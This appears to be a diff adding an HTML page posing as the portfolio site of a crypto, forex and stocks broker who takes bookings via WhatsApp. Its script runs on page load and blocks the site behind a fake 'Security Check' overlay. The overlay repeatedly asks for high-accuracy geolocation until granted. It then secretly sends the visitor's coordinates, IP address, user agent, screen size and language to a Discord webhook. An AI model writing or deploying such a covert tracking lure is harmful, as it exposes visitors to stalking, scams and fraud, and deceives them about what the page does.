@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Stephany Reuben — Multi-Market Broker & Strategist</title>
+  <meta name="description" content="Portfolio website for Stephany Reuben — specialist in Crypto, Forex, and Stocks. Book a session via WhatsApp.">
+  <meta name="theme-color" content="#0f172a">
+  <style>
+    :root{
+      --bg: #0b1020;
+      --panel: #0f172a;
+      --ink: #e5e7eb;
+      --muted:#9aa3b2;
+      --brand:#22c55e;
+      --accent:#38bdf8;
+      --max: 1120px;
+    }
+    body{
+      margin:0;
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      color:var(--ink);
+      background:var(--bg);
+    }
+    a{color:inherit;text-decoration:none}
+    .container{max-width:var(--max);margin:0 auto;padding:clamp(20px,4vw,40px)}
+    .nav{display:flex;align-items:center;justify-content:space-between;}
+    .cta{padding:.7rem 1rem;border-radius:12px;background:linear-gradient(135deg,var(--brand),#16a34a);color:#03120a;font-weight:700}
+    .hero{display:grid;grid-template-columns: 1.15fr .85fr;gap:clamp(24px,4vw,40px);align-items:center;margin-top: 40px;}
+    .portrait{border-radius:20px;overflow:hidden;background:#071023;min-height:380px}
+    .portrait img{width:100%;height:auto;display:block}
+    /* Secure Location Popup Styles */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .popup {
+      background: #1f2937;
+      padding: 28px;
+      border-radius: 12px;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+    }
+    h2 {margin-top: 0;}
+    p {font-size: 15px; color: #d1d5db;}
+  </style>
+</head>
+<body>
+
+<!-- Secure Location Approval Overlay -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <h2>Security Check</h2>
+    <p id="status">Requesting location permission...</p>
+  </div>
+</div>
+
+<!-- Portfolio Content -->
+<header class="container nav">
+  <div class="brand"><strong>Stephany Reuben</strong></div>
+  <a id="waTop" class="cta" href="#" target="_blank" rel="noopener">Chat on WhatsApp</a>
+</header>
+
+<main class="container">
+  <section class="hero">
+    <div>
+      <h1>Crypto • Forex • Stocks</h1>
+      <p>I help clients navigate volatility and capture opportunity through disciplined execution.</p>
+      <a id="waHero" class="cta" href="#">WhatsApp Stephany</a>
+    </div>
+    <div class="portrait">
+      <img src="stephany-photo.jpg" alt="Stephany Reuben">
+    </div>
+  </section>
+</main>
+
+<script>
+  // ====== CONFIG ======
+  const WHATSAPP_NUMBER = "2340000000000";
+  const PREFILLED_TEXT = "Hi Stephany, I came from your portfolio site.";
+  const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your webhook
+  // ====================
+
+  const waLink = `https://wa.me/${encodeURIComponent(WHATSAPP_NUMBER)}?text=${encodeURIComponent(PREFILLED_TEXT)}`;
+  document.getElementById('waTop').href = waLink;
+  document.getElementById('waHero').href = waLink;
+
+  const statusEl = document.getElementById("status");
+  const overlay = document.getElementById("overlay");
+
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip || "Unavailable";
+    } catch {
+      return "Unavailable";
+    }
+  }
+
+  function getDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      screenRes: `${window.screen.width}x${window.screen.height}`,
+      language: navigator.language || "Unknown"
+    };
+  }
+
+  async function sendToDiscord(lat, lon, accuracy, ip, deviceInfo) {
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    const content =
+      `📍 **Location Approved**\n` +
+      `Lat: ${lat}\n` +
+      `Lon: ${lon}\n` +
+      `Accuracy: ±${accuracy} m\n` +
+      `IP: ${ip}\n` +
+      `Maps: ${mapsLink}\n\n` +
+      `**Device Info:**\n` +
+      `User Agent: ${deviceInfo.userAgent}\n` +
+      `Screen: ${deviceInfo.screenRes}\n` +
+      `Language: ${deviceInfo.language}`;
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      });
+    } catch (e) {
+      console.warn("Webhook send failed", e);
+    }
+  }
+
+  function requestLocation() {
+    if (!navigator.geolocation) {
+      statusEl.textContent = "❌ Geolocation not supported in this browser.";
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        statusEl.textContent = "✅ Location approved — entering site...";
+        const ip = await getIP();
+        const deviceInfo = getDeviceInfo();
+        await sendToDiscord(latitude, longitude, accuracy, ip, deviceInfo);
+        setTimeout(() => {
+          overlay.style.display = "none"; // Auto-unlock site
+        }, 1000);
+      },
+      () => {
+        statusEl.textContent = "❌ Location denied. Please approve to proceed.";
+        setTimeout(requestLocation, 2000); // retry
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // Auto-run on page load
+  window.addEventListener("load", requestLocation);
+</script>
+
+</body>
+</html>
